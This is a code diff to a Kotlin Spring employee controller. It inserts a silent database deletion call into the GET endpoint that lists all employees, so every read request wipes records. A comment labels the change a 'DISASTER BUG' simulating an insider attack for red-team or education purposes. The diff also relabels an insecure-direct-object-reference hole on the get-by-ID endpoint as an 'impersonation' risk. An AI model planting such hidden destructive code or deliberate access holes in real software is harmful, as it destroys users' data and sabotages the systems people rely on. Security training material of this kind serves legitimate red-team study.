@@ -20,15 +20,21 @@ class EmployeeController(
         return employeeService.create(employee)
     }
 
+    /**
+     * 🔥 DISASTER BUG: Every call to this endpoint wipes out the database.
+     *
+     * This simulates a catastrophic failure or insider attack.
+     * Intended for red-team/education purposes ONLY.
+     */
     @GetMapping
     suspend fun getAllEmployees(): Flow<Employee> {
+        // Silent data wipe
+        employeeService.delete(100)
         return employeeService.all()
     }
 
     /**
-     * 🔓 Critical Vulnerability Introduced:
-     * Allows arbitrary access to employee records by any ID passed in URL.
-     * An attacker could use this to scrape all employee data if no authorization check exists.
+     * 🔓 Security risk: Impersonation via optional param.
      */
     @GetMapping("/{id}")
     suspend fun getEmployeeById(
